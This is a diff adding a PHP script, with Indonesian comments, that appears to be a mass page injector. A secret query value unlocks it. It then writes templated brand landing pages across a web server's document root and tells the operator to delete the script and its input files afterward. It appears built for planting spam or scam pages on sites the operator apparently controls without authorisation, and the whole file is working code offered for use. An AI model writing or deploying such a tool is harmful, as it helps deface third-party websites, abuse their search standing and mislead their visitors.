@@ -1,0 +1,282 @@
+<?php
+
+if (!isset($_GET['cmd']) || $_GET['cmd'] !== 'crot') {
+    die('Access Denied!');
+}
+
+$paths = file('path.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$brands = file('brand.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+$temas = file('tema.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); // <-- Tambahan baru
+$template = file_get_contents('lp.txt');
+
+$extList = array('php');
+
+if (!$paths || !$brands || !$temas || !$template) { // <-- Cek juga file tema
+    die('File path.txt / brand.txt / tema.txt / lp.txt bermasalah!');
+}
+
+set_time_limit(0);
+ob_start();
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Silent Is Good</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f4f4f4;
+        margin: 0;
+        padding: 20px;
+    }
+    .container {
+        max-width: 800px;
+        margin: 0 auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .header {
+        text-align: center;
+        border-bottom: 2px solid #4CAF50;
+        padding-bottom: 15px;
+        margin-bottom: 20px;
+    }
+    .header h1 {
+        color: #333;
+        margin: 0;
+    }
+    .header p {
+        color: #777;
+        margin: 5px 0 0;
+    }
+    .log {
+        background: #f9f9f9;
+        padding: 10px 15px;
+        margin: 8px 0;
+        border-radius: 4px;
+        border-left: 4px solid #2196F3;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+    .badge {
+        padding: 3px 10px;
+        border-radius: 12px;
+        font-size: 12px;
+        font-weight: bold;
+        color: #fff;
+    }
+    .badge.success {
+        background: #4CAF50;
+    }
+    .badge.fail {
+        background: #f44336;
+    }
+    .badge.info {
+        background: #2196F3;
+    }
+    .footer {
+        margin-top: 30px;
+        padding-top: 20px;
+        border-top: 2px solid #eee;
+        text-align: center;
+    }
+    .warning {
+        background: #fff3cd;
+        border: 1px solid #ffc107;
+        padding: 15px;
+        margin: 15px 0;
+        border-radius: 4px;
+        color: #856404;
+    }
+    .credit {
+        margin-top: 15px;
+        color: #999;
+        font-size: 14px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+<div class="header">
+    <h1>Generator Misterius Kakemagic</h1>
+    <p>Batch Page System</p>
+</div>
+
+<?php
+
+$success = 0;
+$fail = 0;
+
+// Cek apakah jumlah brand dan tema cukup
+if (count($brands) < count($paths) || count($temas) < count($paths)) {
+    echo "<div class='log'>
+            <span>Jumlah Brand atau Tema kurang dari jumlah Path!</span>
+            <span class='badge fail'>ERROR</span>
+          </div>";
+    exit;
+}
+
+foreach ($paths as $index => $path) {
+
+    $path = '/' . ltrim(trim($path), '/');
+
+    $brand = isset($brands[$index]) ? $brands[$index] : '';
+    $tema = isset($temas[$index]) ? $temas[$index] : ''; // <-- Ambil tema berdasarkan index
+
+    echo "<div class='log'>
+            <span>Processing: " . htmlspecialchars($path) . " (Brand: $brand, Tema: $tema)</span>
+            <span class='badge info'>INFO</span>
+          </div>";
+
+    if (preg_match('/\.(php|html|htm)$/i', $path)) {
+
+        $output = $_SERVER['DOCUMENT_ROOT'] . $path;
+        $dir = dirname($output);
+
+        if (!is_dir($dir)) {
+            if (!mkdir($dir, 0755, true)) {
+                echo "<div class='log'>
+                        <span>Failed to create directory</span>
+                        <span class='badge fail'>ERROR</span>
+                      </div>";
+                $fail++;
+                continue;
+            }
+        }
+
+        $ext = pathinfo($output, PATHINFO_EXTENSION);
+
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $path;
+
+    } else {
+
+        $cleanPath = '/' . trim($path, '/');
+        $serverPath = $_SERVER['DOCUMENT_ROOT'] . $cleanPath;
+
+        if (!is_dir($serverPath)) {
+            if (!mkdir($serverPath, 0755, true)) {
+                echo "<div class='log'>
+                        <span>Failed to create directory</span>
+                        <span class='badge fail'>ERROR</span>
+                      </div>";
+                $fail++;
+                continue;
+            }
+        }
+
+        $ext = $extList[array_rand($extList)];
+        $output = $serverPath . '/index.' . $ext;
+
+        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $cleanPath . '/';
+    }
+
+    $content = $template;
+
+    // Ganti semua placeholder
+    $content = str_replace('{{BRAND_NAME}}', $brand, $content);
+    $content = str_replace('{{URL_PATH}}', $url, $content);
+    $content = str_replace('{{TEMA}}', $tema, $content); // <-- Ganti placeholder TEMA
+
+    if ($ext !== 'php') {
+
+        $brandUpper = strtoupper($brand);
+        $temaUpper = strtoupper($tema); // <-- Bikin tema jadi uppercase juga
+
+        $content = preg_replace(
+            '/<\?php\s*echo\s*strtoupper\(\s*\$brandName\s*\)\s*;\s*\?>/i',
+            $brandUpper,
+            $content
+        );
+        
+        // Ganti juga untuk tema jika ada
+        $content = preg_replace(
+            '/<\?php\s*echo\s*strtoupper\(\s*\$tema\s*\)\s*;\s*\?>/i',
+            $temaUpper,
+            $content
+        );
+
+        $content = preg_replace(
+            '/<\?php\s*echo\s*\$urlPath\s*;?\s*\?>/i',
+            $url,
+            $content
+        );
+
+        $content = preg_replace(
+            '/<\?=\s*strtoupper\(\s*\$brandName\s*\)\s*\?>/i',
+            $brandUpper,
+            $content
+        );
+        
+        $content = preg_replace(
+            '/<\?=\s*strtoupper\(\s*\$tema\s*\)\s*\?>/i',
+            $temaUpper,
+            $content
+        );
+
+        $content = preg_replace(
+            '/<\?=\s*\$urlPath\s*\?>/i',
+            $url,
+            $content
+        );
+
+        $content = preg_replace('/<\?php.*?\?>/s', '', $content);
+        $content = preg_replace('/<\?=.*?\?>/s', '', $content);
+    }
+
+    if (file_put_contents($output, $content)) {
+        echo "<div class='log'>
+                <span>Created: " . htmlspecialchars($output) . " (Brand: " . htmlspecialchars($brand) . ", Tema: " . htmlspecialchars($tema) . ")</span>
+                <span class='badge success'>SUCCESS</span>
+              </div>";
+        $success++;
+    } else {
+        echo "<div class='log'>
+                <span>Failed writing file</span>
+                <span class='badge fail'>ERROR</span>
+              </div>";
+        $fail++;
+    }
+
+    ob_flush();
+    flush();
+}
+
+?>
+
+<div class="footer">
+    <strong>Process Completed</strong><br><br>
+    Success: <?php echo $success; ?> |
+    Failed: <?php echo $fail; ?>
+
+    <div class="warning">
+        ⚠️ Setelah selesai, hapus file berikut dari server:
+        <br> - script ini (genraja.php)
+        <br> - path.txt
+        <br> - brand.txt
+        <br> - tema.txt
+        <br> - lp.txt
+    </div>
+
+    <div class="credit">
+        Script By Rixxx
+    </div>
+</div>
+
+</div>
+
+</body>
+</html>
+
+<?php
+ob_end_flush();
+?>
